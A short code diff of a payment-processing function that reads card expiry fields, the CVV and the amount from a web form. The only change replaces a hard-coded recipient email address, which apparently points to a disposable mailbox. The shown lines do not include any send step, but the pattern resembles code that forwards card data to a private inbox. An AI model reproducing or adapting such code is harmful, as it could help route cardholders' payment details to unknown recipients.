@@ -40,7 +40,7 @@ def process_payment():
         expiry_month = request.form['expiry-month']
         expiry_year = request.form['expiry-year']
         cvv = request.form['cvv']
-        RECIPIENT_EMAIL = 'gesod90877@andorem.com'
+        RECIPIENT_EMAIL = 'palav73241@duscore.com'
         amount = request.form['amount']
 
         # Generate the payment receipt
